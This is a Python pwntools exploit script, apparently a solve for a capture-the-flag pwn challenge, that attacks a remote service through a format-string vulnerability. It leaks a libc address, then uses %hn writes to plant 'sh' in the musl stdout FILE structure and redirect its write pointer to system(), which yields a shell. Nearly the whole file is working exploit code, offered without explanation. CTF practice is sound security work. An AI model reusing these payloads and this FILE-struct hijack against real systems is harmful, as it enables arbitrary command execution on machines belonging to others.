from pwn import *

context.binary = exe = ELF("../challenge/chall")
# context.terminal = ['tmux','splitw','-h']
context.terminal = ["kitty"]

libc = ELF("../challenge/libc.so")


def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote("yellow.chals.nitectf25.live", 1337, ssl=True)
    return r


def make_char(idx, cl, name):
    r.sendlineafter(b">>", b"1")
    r.sendlineafter(b":", str(idx).encode())
    r.sendlineafter(b">>", str(cl).encode())
    r.sendlineafter(b">>", name)


def action(idx):
    r.sendlineafter(b">>", b"2")
    r.sendlineafter(b":", str(idx).encode())


r = conn()
make_char(0, 1, b"a" * 32)

action(0)
pl = b"%c" * 8 + b"%c%c%s.." + p64(0x404040)  # leak libc
r.sendline(pl)

libc.address = unpack(r.recvuntil(b"@@@").split(b"%%%")[1][:6], "all") - (
    0x7F3DFAB88CA0 - 0x00007F3DFAAC7000
)
log.info(f"libc @ {hex(libc.address)}")
log.info(f"stdout file @ {hex(libc.sym['__stdout_FILE'])}")

stderr_file = libc.sym["__stdout_FILE"]

# write E;sh;\x00 where E is 0x45 part of the flag file struct
pl = b"%c" * 8 + b"%c%c%29489c%hn.." + p64(stderr_file + 1)
action(0)
r.sendline(pl)
pl = b"%c" * 8 + b"%c%c%15198c%hn.." + p64(stderr_file + 3)
action(0)
r.sendline(pl)

# change last 2 bytes of write ptr of file struct, points to a function for writing ?
offset_to_system = libc.sym["system"] & (0xFFFF)
print(hex(offset_to_system))

pl = b"%c" * 8 + f"%c%c%{offset_to_system - 10}c%hn..".encode() + p64(stderr_file + 72)
print(len(pl))
action(0)
r.sendline(pl)


r.interactive()
